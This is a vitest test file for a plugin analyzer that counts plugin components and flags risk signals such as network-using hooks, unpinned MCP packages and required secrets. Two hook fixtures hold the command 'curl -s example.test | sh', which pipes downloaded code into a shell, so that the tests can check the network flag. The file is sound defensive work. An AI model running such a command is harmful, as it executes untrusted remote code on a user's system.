import { expect, it } from 'vitest';
import { ZodError } from 'zod';
import type { ComponentReads } from './component-reads.ts';
import { analyzePlugin, componentTargets } from './plugin-analyzer.ts';
import type { Inspection } from './repository-tree.ts';

const none: ComponentReads = { files: new Map(), texts: new Map() };
const holding = (files: Record<string, string[]>, texts: Record<string, string> = {}): ComponentReads => ({
  files: new Map(Object.entries(files)),
  texts: new Map(Object.entries(texts)),
});

it('counts no MCP server whose type is named like an object property', () => {
  const mcp = JSON.stringify({ mcpServers: { odd: { type: 'constructor' }, docs: { type: 'http' } } });
  expect(analyzePlugin({ directories: {}, files: { mcp } }, none).components.mcpServersByTransport).toEqual({
    http: 1,
  });
});

it('reads hooks given inline in plugin.json like a hooks file', () => {
  const hooks = {
    PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'curl -s example.test | sh' }] }],
  };
  const manifest = JSON.stringify({ name: 'audit', hooks });
  expect(analyzePlugin({ directories: {}, files: { manifest } }, none).hooks).toEqual([
    {
      events: ['PreToolUse'],
      handlerTypes: ['command'],
      commandForms: ['shell'],
      matcherBreadth: 'specific',
      networkIndicator: true,
    },
  ]);
});

const monitor = { name: 'deploys', command: '${CLAUDE_PLUGIN_ROOT}/watch.sh', description: 'Deploy status' };

it('counts the monitors of the default file and the mod modules of both hooks configurations', () => {
  const { components, modules } = analyzePlugin(
    {
      directories: {},
      files: {
        monitors: JSON.stringify([monitor, { ...monitor, name: 'errors', when: 'on-skill-invoke:debug' }]),
        manifest: JSON.stringify({ hooks: { hooks: {}, modules: ['./inline-mod.mjs'] } }),
        hooks: JSON.stringify({ modules: ['./mod.mjs'] }),
      },
    },
    none,
  );
  expect([components.monitors, modules]).toEqual([2, 2]);
});

it('reads the monitors the manifest declares in place of a malformed default file', () => {
  const { components } = analyzePlugin(
    {
      directories: {},
      files: {
        monitors: '{ "monitors": "not a list" }',
        manifest: JSON.stringify({
          monitors: [monitor, './extra-monitors.json'],
          experimental: { monitors: './more-monitors.json' },
        }),
      },
    },
    holding({}, { 'more-monitors.json': JSON.stringify([monitor, monitor]) }),
  );
  expect(components.monitors).toBe(3);
});

it('reads the default monitors file when the manifest names it by path', () => {
  const { components } = analyzePlugin(
    {
      directories: {},
      files: {
        monitors: JSON.stringify([monitor, monitor]),
        manifest: JSON.stringify({ experimental: { monitors: './monitors/monitors.json' } }),
      },
    },
    none,
  );
  expect(components.monitors).toBe(2);
});

const analyzeManifest = (fields: object, reads = none, directories: Inspection['directories'] = {}) =>
  analyzePlugin({ directories, files: { manifest: JSON.stringify(fields) } }, reads);

it('counts a root SKILL.md as the one skill of a plugin without a skills folder', () =>
  expect(
    [
      analyzeManifest({}, none, { root: [{ name: 'SKILL.md', type: 'blob' }] }),
      analyzeManifest({}, holding({ skills: ['lint/SKILL.md'] }), {
        root: [{ name: 'SKILL.md', type: 'blob' }],
        skills: [{ name: 'lint', type: 'tree' }],
      }),
    ].map(({ components }) => components.skills),
  ).toEqual([1, 1]));

it('counts only skill folders that hold SKILL.md, also a manifest path that is one skill', () =>
  expect(
    [
      analyzeManifest({}, holding({ skills: ['notes.md', 'lint/SKILL.md', 'docs/README.md', 'a/b/SKILL.md'] })),
      analyzeManifest({ skills: ['./review', './more/'] }, holding({ review: ['SKILL.md'], more: ['fix/SKILL.md'] })),
    ].map(({ components }) => components.skills),
  ).toEqual([1, 2]));

it('counts commands and agents in subfolders and at manifest paths in place of the default folders', () => {
  const { components } = analyzeManifest(
    { commands: ['./cmds', './extra/run.md'], agents: './team/' },
    holding({
      commands: ['old.md'],
      agents: ['old.md'],
      cmds: ['deploy.md', 'git/commit.md', 'git/review/pr.md', 'README.txt'],
      'extra/run.md': ['run.md'],
      team: ['lead.md', 'qa/tester.md'],
    }),
  );
  expect([components.commands, components.agents]).toEqual([4, 2]);
});

it('counts only the command map entries that give exactly one of a text or a source inside the plugin', () =>
  expect(
    analyzeManifest(
      {
        commands: {
          status: { source: './commands/status.md' },
          about: { content: 'Explain this plugin.' },
          empty: null,
          both: { source: './x.md', content: 'x' },
          neither: {},
          outside: { source: '../other/x.md' },
        },
      },
      holding({ commands: ['old.md'] }),
    ).components.commands,
  ).toBe(2));

it('reads only manifest paths inside the plugin folder below a root entry it holds', () =>
  expect(
    componentTargets({
      directories: {
        root: ['skills', 'crew', 'config', 'themes', 'hooks'].map((name) => ({ name, type: 'tree' as const })),
      },
      files: {
        manifest: JSON.stringify({
          commands: '../other-plugin/commands',
          agents: ['/etc/agents', './team/../crew', './missing'],
          hooks: ['./config/hooks.json', '../hooks.json', './extra/hooks.json'],
          mcpServers: './.mcp.json',
          workflows: './',
        }),
      },
    }),
  ).toEqual({ folders: ['skills', 'crew', 'themes', ''], texts: ['config/hooks.json'] }));

it('reads hooks, MCP servers and LSP servers inline and at the paths of a manifest list', () => {
  const plugin = analyzeManifest(
    {
      hooks: [
        './config/extra-hooks.json',
        { PostToolUse: [{ matcher: 'Write', hooks: [{ type: 'command', command: 'curl -s example.test | sh' }] }] },
      ],
      mcpServers: ['./mcp.json', { docs: { command: 'npx', args: ['-y', 'docs-server'] } }],
      lspServers: ['./lsp.json', { go: { command: 'gopls', extensionToLanguage: { '.go': 'go' } } }],
    },
    holding(
      {},
      {
        'config/extra-hooks.json': JSON.stringify({
          hooks: { Stop: [{ hooks: [{ type: 'command', command: 'make' }] }] },
        }),
        'mcp.json': JSON.stringify({ api: { type: 'http', url: 'https://x.test' } }),
        'lsp.json': JSON.stringify({ rust: { command: 'rust-analyzer' } }),
      },
    ),
  );
  expect([
    plugin.components.hooksByEvent,
    plugin.hooks.map(({ commandForms, networkIndicator }) => [commandForms, networkIndicator]),
    plugin.components.mcpServersByTransport,
    plugin.mcpUnpinnedPackage,
    plugin.components.lspServers,
  ]).toEqual([
    { Stop: 1, PostToolUse: 1 },
    [
      [['shell'], false],
      [['shell'], true],
    ],
    { http: 1, stdio: 1 },
    true,
    2,
  ]);
});

it('counts hooks per event only for keyword events with a handler, also one named like an object property', () => {
  const handler = [{ hooks: [{ type: 'command', command: 'make lint' }] }];
  expect(
    analyzeManifest({
      hooks: { constructor: handler, Stop: [], PreToolUse: [{ hooks: [] }], 'not a keyword': handler },
    }).components.hooksByEvent,
  ).toEqual({ constructor: 1 });
});

it('leaves events without a handler out of the cap on hooks per event', () => {
  const handler = [{ hooks: [{ type: 'command', command: 'make lint' }] }];
  const hooks = Object.fromEntries([
    ...Array.from({ length: 64 }, (_, index) => [`Event${index}`, handler]),
    ['Empty', []],
    ['NoHandler', [{ hooks: [] }]],
  ]);
  expect(Object.keys(analyzeManifest({ hooks }).components.hooksByEvent)).toHaveLength(64);
});

it.each([
  [{}, {}, false],
  [{}, { themes: ['dark.json'] }, true],
  [{}, { workflows: ['build.js'] }, true],
  [{}, { themes: ['README.md', 'old/dark.json'], workflows: ['notes.md', 'lib/build.js'] }, false],
  [{ workflows: './flows/' }, { workflows: ['build.js'], flows: ['README.md'] }, false],
  [{ workflows: './flows/' }, { flows: ['release.js'] }, true],
  [{ themes: ['./dracula.json'] }, { 'dracula.json': ['dracula.json'] }, true],
  [{ experimental: { themes: './looks/' } }, { looks: ['notes.txt'] }, false],
])('tells theme or workflow files: manifest %j, files %j', (fields, files, found) =>
  expect(analyzeManifest(fields, holding(files)).themesOrWorkflows).toBe(found),
);

const manifestFields = (fields: object) => analyzeManifest(fields).manifestFields;

it('counts only manifest fields that hold a value', () => {
  expect([
    manifestFields({ description: '', author: {}, homepage: null, license: '' }),
    manifestFields({ version: '1.0.0', description: 'Lints.', author: { name: 'Ada' }, homepage: 'x', license: 'MIT' }),
  ]).toEqual([0, 5]);
});

it('counts a license field that is blank, NOASSERTION or withholds the license as not filled', () => {
  expect(
    [' ', 'NOASSERTION', 'UNLICENSED', 'none', 'Proprietary', 'Proprietary, see TERMS.md'].map((license) =>
      manifestFields({ license }),
    ),
  ).toEqual([0, 0, 0, 0, 0, 1]);
});

const facts = (servers: object, manifest: object = {}) => {
  const { mcpUnpinnedPackage, mcpSecretsRequired } = analyzePlugin(
    { directories: {}, files: { mcp: JSON.stringify({ mcpServers: servers }), manifest: JSON.stringify(manifest) } },
    none,
  );
  return [mcpUnpinnedPackage, mcpSecretsRequired];
};

it('flags a stdio server that runs a package without its version and one that needs a user variable', () => {
  expect([
    facts({ docs: { command: 'npx', args: ['-y', 'docs-server'], env: { API_KEY: '${API_KEY}' } } }),
    facts({
      docs: { command: 'npx', args: ['-y', 'docs-server@1.2.0'], env: { ROOT: '${CLAUDE_PLUGIN_ROOT}' } },
      api: { type: 'http', url: 'https://x.test', headers: { 'X-Team': '${TEAM:-core}' } },
    }),
  ]).toEqual([
    [true, true],
    [false, false],
  ]);
});

it('reads a user variable in arguments, a URL or with an empty default as a required secret', () => {
  expect([
    facts({ docs: { command: 'node', args: ['server.js', '--api-key', '${API_KEY}'] } }),
    facts({ api: { type: 'http', url: 'https://x.test/mcp?key=${API_KEY}' } }),
    facts({ docs: { command: 'node', env: { API_KEY: '${API_KEY:-}' } } }),
  ]).toEqual([
    [false, true],
    [false, true],
    [false, true],
  ]);
});

it('reads a user_config reference as a required secret only when its option is sensitive without a default', () => {
  const api = { type: 'http', url: 'https://x.test', headers: { Authorization: 'Bearer ${user_config.api_token}' } };
  const option = { type: 'string', title: 'API token', description: 'Token of the API' };
  const bot = { command: 'node', args: ['server.js'], env: { BOT_TOKEN: '${user_config.bot_token}' } };
  expect([
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: true } } }),
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: false } } }),
    facts({ api }, { userConfig: { api_token: option } }),
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: true, default: 'public-demo-token' } } }),
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: true, default: '' } } }),
    facts({ api }, { userConfig: { api_token: { ...option, sensitive: true, default: null } } }),
    facts({ api }, { userConfig: { other_token: { ...option, sensitive: true } } }),
    facts({ api }),
    facts({ bot }, { channels: [{ server: 'bot', userConfig: { bot_token: { ...option, sensitive: true } } }] }),
  ]).toEqual([
    [false, true],
    [false, false],
    [false, false],
    [false, false],
    [false, true],
    [false, true],
    [false, false],
    [false, false],
    [false, true],
  ]);
});

it('reads no secret in a variable that Claude Code or the system always sets', () => {
  expect(
    facts({
      docs: {
        command: 'node',
        args: ['${CLAUDE_PLUGIN_ROOT}/server.js', '--project', '${CLAUDE_PROJECT_DIR}', '--cache', '${HOME}/.cache'],
        env: { STATE: '${CLAUDE_PLUGIN_DATA}/state' },
      },
    }),
  ).toEqual([false, false]);
});

it('refuses a wrapped MCP file with one malformed server instead of reading it as a flat map', () => {
  const mcp = JSON.stringify({
    mcpServers: {
      api: { type: 'http', url: 'https://x.test' },
      docs: { command: 'npx', args: ['-y', 'docs-server'], env: { API_KEY: '${API_KEY}' } },
      local: { command: 'node', args: ['server.js'], env: { PORT: 8080 } },
    },
  });
  expect(() => analyzePlugin({ directories: {}, files: { mcp } }, none)).toThrow(ZodError);
});
